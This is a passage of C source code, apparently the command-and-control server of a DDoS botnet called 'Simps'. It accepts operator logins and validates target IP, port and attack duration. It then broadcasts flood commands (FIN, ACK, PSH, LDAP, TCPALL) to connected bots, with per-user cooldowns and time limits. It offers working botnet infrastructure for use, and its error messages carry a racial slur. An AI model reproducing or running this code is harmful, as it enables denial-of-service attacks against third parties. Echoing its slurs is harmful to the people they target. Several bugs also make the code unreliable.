							!strcasecmp(arg[1], "FIN") ||
							!strcasecmp(arg[1], "ACK") ||
							!strcasecmp(arg[1], "PSH") ||
							!strcasecmp(arg[1], "LDAP") ||
							!strcasecmp(arg[1], "TCPALL") ||
							!strcasecmp(arg[1], "STOPALL"))
						{
							char ip[80];
							strcpy(ip, arg[2]);
							if (strlen(ip) > 15 || strlen(ip) < 7)
							{
								sprintf(botnet, "\e[37mInvalid Ip\e[31m!\r\n");
								if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
									goto end;
								memset(botnet, 0, sizeof(botnet));
								goto WhileEnd;
							}
							if (atoi(arg[3]) > 65535 || atoi(arg[3]) < 1)
							{
								sprintf(botnet, "\e[37mInvalid Port\e[31m!\r\n");
								if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
									goto end;
								memset(botnet, 0, sizeof(botnet));
								goto WhileEnd;
							}
							if (atoi(arg[4]) > managements[datafd].maxtime)
							{
								sprintf(botnet, "\e[37mMax Time Exceeded By: %d\e[31m!\r\n", atoi(arg[4]) - managements[datafd].maxtime);
								if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
									goto end;
								memset(botnet, 0, sizeof(botnet));
								goto WhileEnd;
							}
							UsersAttacks++;
							sprintf(botnet, "\e[37mCommand Sent With %d Bots\e[31m!\r\n", BotsConnected());
							if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
								goto end;
							memset(botnet, 0, sizeof(botnet));
							broadcast(buf);

							struct CoolDownArgs argx;
							pthread_t Cld;
							argx.sock = datafd;
							argx.seconds = managements[datafd].cooldown;
							pthread_create(&Cld, NULL, &StartCldown, (void *)&argx);
						}
						else
						{
							sprintf(botnet, "\e[37mInvalid Method\e[31m!\r\n");
							if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
								goto end;
							memset(botnet, 0, sizeof(botnet));
							goto WhileEnd;
						}
					}
					else
					{
						sprintf(botnet, "\e[37mYour Coold Down Is Not Over, Time Left: %d\r\n", managements[datafd].cooldown - managements[datafd].CoolDownSecs);
						if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
							goto end;
						memset(botnet, 0, sizeof(botnet));
					}
				}
				else
				{
					sprintf(botnet, "\e[37mNo Devices Are Connected\e[31m!\r\n");
					if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
						goto end;
					memset(botnet, 0, sizeof(botnet));
				}
			}
			else
			{
				sprintf(botnet, "\e[37mAttacks Are Disabled\e[31m!\r\n");
				if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
					goto end;
				memset(botnet, 0, sizeof(botnet));
			}
		}

		/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

	WhileEnd:
		sprintf(botnet, "\e[31m╔═\e[31m[\e[95m%s\e[31m@\e[95mSimps\e[31m]\e[96m$\r\n\e[31m╚═══════\e[95m>\e[96m ", accounts[find_line].username);
		if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
			goto end;
		FILE *LogFile;
		LogFile = fopen("Server.log", "a");
		fprintf(LogFile, "%s: %s\r\n", accounts[find_line].username, buf);
		fclose(LogFile);
		memset(buf, 0, sizeof(buf));
	}

	/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

failed:
	Title[datafd].login = 19;
	if (send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1)
		goto end;
	sprintf(botnet, "\e[37mLogin Failed Your Ip Was Logged Lol.\r\n");
	if (send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1)
		goto end;
	FILE *FailedFile;
	FailedFile = fopen("FailedLogin.log", "a");
	fprintf(FailedFile, "Someone Failed a Login To Simps.\r\n");
	fclose(FailedFile);
	memset(botnet, 0, sizeof(botnet));
	sleep(3);
	goto end;

	/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

end:
	if (SuccessfulLogin == 2)
	{
		UsersConnected--;
		FILE *LoggedoutFile;
		LoggedoutFile = fopen("LoggedOut.log", "a");
		fprintf(LoggedoutFile, "%s: Has Successfully Logged Out.\r\n", accounts[find_line].username);
		fclose(LoggedoutFile);
	}
	close(datafd);
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

void *BotListener(int *useless)
{
	int sockfd, ClientSock, ye = 1;
	socklen_t clilen;
	struct sockaddr_in serv, cli;
	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
		perror("ERROR opening socket");
	if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &ye, sizeof(int)) < 0)
		;
	memset(&serv, 0, sizeof(serv));
	serv.sin_family = AF_INET;
	serv.sin_addr.s_addr = INADDR_ANY;
	serv.sin_port = htons(CncPort);
	if (bind(sockfd, (struct sockaddr *)&serv, sizeof(serv)) < 0)
		perror("ERROR on binding");
	listen(sockfd, 5);
	printf("CncPort: [%s]\r\n", cnc_port);
	clilen = sizeof(cli);
	while (1)
	{
		FILE *conlog = fopen("Ip.log", "a");
		fprintf(conlog, "Ip Address: [%d.%d.%d.%d] Connected To Simps Cnc.\r\n", cli.sin_addr.s_addr & 0xFF, (cli.sin_addr.s_addr & 0xFF00) >> 8, (cli.sin_addr.s_addr & 0xFF0000) >> 16, (cli.sin_addr.s_addr & 0xFF000000) >> 24);
		fclose(conlog);
		ClientSock = accept(sockfd, (struct sockaddr *)&cli, &clilen);
		if (ClientSock < 0)
			perror("ERROR on accept");
		pthread_t clithread;
		pthread_create(&clithread, NULL, &BotWorker, (void *)ClientSock);
	}
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/

int main(int argc, char *argv[])
{
	signal(SIGPIPE, SIG_IGN);
	if (argc != 1)
	{
		fprintf(stderr, "Usage %s \n", argv[0]);
		exit(EXIT_FAILURE);
	}
	puts("\e[37mScreening.");
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	memset(&hints, 0, sizeof(struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_flags = AI_PASSIVE;
	printf("BotPort: [%s]\r\n", bot_port);
	if (getaddrinfo(NULL, bot_port, &hints, &result) != 0)
		return -1;
	int bindtobp = -1;
	for (rp = result; rp != NULL; rp = rp->ai_next)
	{
		if ((ListenFD = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol)) == -1)
			perror("Nigger");
		if (setsockopt(ListenFD, SOL_SOCKET, SO_REUSEADDR, 1, 1) == -1)
			;
		if ((bindtobp = bind(ListenFD, rp->ai_addr, rp->ai_addrlen)) == 0)
			break;
		close(ListenFD);
	}
	if (bindtobp != 0)
		perror("Nigger");
	if (rp == NULL)
		abort();
	freeaddrinfo(result);
	int flag, s;
	fcntl(ListenFD, F_GETFL, 0) | fcntl(ListenFD, F_SETFL, O_NONBLOCK);
	if (listen(ListenFD, SOMAXCONN) == -1)
		abort();
	if ((EpollFD = epoll_create1(0)) == -1)
		abort();
	struct epoll_event event;
	event.data.fd = ListenFD;
	event.events = EPOLLIN | EPOLLET;
	if (epoll_ctl(EpollFD, EPOLL_CTL_ADD, ListenFD, &event) == -1)
		abort();
	pthread_t epthread;
	pthread_create(&epthread, NULL, &BotEventLoop, (void *)NULL);
	pthread_t cthread;
	pthread_create(&cthread, NULL, &BotListener, CncPort);
	while (1)
	{
		sleep(120);
	}
	close(ListenFD);
	return EXIT_SUCCESS;
}

/*-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------*/